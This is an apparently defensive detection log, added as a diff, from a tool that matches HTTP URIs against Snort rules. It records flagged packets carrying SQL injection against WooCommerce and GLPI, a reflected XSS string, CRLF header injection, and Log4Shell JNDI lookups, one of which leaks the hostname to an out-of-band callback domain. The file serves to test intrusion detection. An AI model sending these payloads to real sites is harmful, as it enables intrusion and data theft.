@@ -1,0 +1,26 @@
+# inspectorlog v3.5
+#----- Initializing Rules (SNORT) ---------------------
+# Rules directory : "/home/kali/Downloads/reglas_javi/snort"
+#	Opening SNORT rule file /home/kali/Downloads/reglas_javi/snort/http_uri-sn-20220324.rules... done
+#		Rules: read [3749], erroneous [0], URI [384]
+#	Opening SNORT rule file /home/kali/Downloads/reglas_javi/snort/http_uri-er-20220224.rules... done
+[parse_snortRule] WARNING: Line [4970] exceeds allowed number of PCRE fields
+#		Rules: read [6015], erroneous [0], URI [5116]
+#----- Statistics (SNORT) ------------------------------
+# Read [9764] Snort rules, [5500] http-related, [0] with errors
+#----- Analysis results ----------------------------
+# Alerts & signatures generated from: /home/kali/Downloads/inspectorlog/inspectorlog -l injection.uri -r /home/kali/Downloads/reglas_javi/snort -t list -o /home/kali/TFG/inspectorlog/snort/web_estatica/owasp/opensource/nuclei/injection.clean
+Packet [4]	Uri [/web/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500]	Nattacks [4]	Signatures	[2006445]	[2006446]	[2010963]	[2011042]
+Packet [6]	Uri [/web/plus/pass_reset.php?L=english&pmc_username=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C]	Nattacks [1]	Signatures	[2009714]
+Packet [16]	Uri [/web/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0]	Nattacks [2]	Signatures	[2011763]	[2017143]
+Packet [22]	Uri [/web/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1]	Nattacks [3]	Signatures	[2006446]	[2011037]	[2014890]
+Packet [31]	Uri [/web/wp-json/wc/store/products/collection-data?calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500]	Nattacks [4]	Signatures	[2006445]	[2006446]	[2010963]	[2011042]
+Packet [32]	Uri [/web/plus/pass_reset.php?L=english&pmc_username=%22%3E%3Cscript%3Ealert(1337)%3C/script%3E%3C]	Nattacks [1]	Signatures	[2009714]
+Packet [39]	Uri [/web/test.txt%0d%0aSet-Cookie:CRLFInjection=Test%0d%0aLocation:%20example.com%0d%0aX-XSS-Protection:0]	Nattacks [2]	Signatures	[2011763]	[2017143]
+Packet [44]	Uri [/web/glpi/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1]	Nattacks [3]	Signatures	[2006446]	[2011037]	[2014890]
+Packet [48]	Uri [/web/?rest_route=/wc/store/products/collection-data&calculate_attribute_counts[0][query_type]=or&calculate_attribute_counts[0][taxonomy]=%252522%252529%252520union%252520all%252520select%2525201%25252Cconcat%252528id%25252C0x3a%25252c%252522sqli-test%252522%252529from%252520wp_users%252520where%252520%252549%252544%252520%252549%25254E%252520%2525281%252529%25253B%252500]	Nattacks [4]	Signatures	[2006445]	[2006446]	[2010963]	[2011042]
+Packet [51]	Uri [/web/scripts/unlock_tasks.php?cycle=1%20UNION%20ALL%20SELECT%201,(@@version)--%20&only_tasks=1]	Nattacks [3]	Signatures	[2006446]	[2011037]	[2014890]
+Packet [80]	Uri [/web/?x=${jndi:ldap://127.0.0.1]	Nattacks [2]	Signatures	[58722]	[58744]
+Packet [81]	Uri [/web/?x=${jndi:ldap://${hostName}.c8acdv19m8v8vih9b0ngcekcxyyyyyyyr.oast.fun/a}]	Nattacks [2]	Signatures	[58722]	[58744]
+# N. packets [83], [12] with alerts, N. Alerts [31]
+# Execution time: 0.231148 s
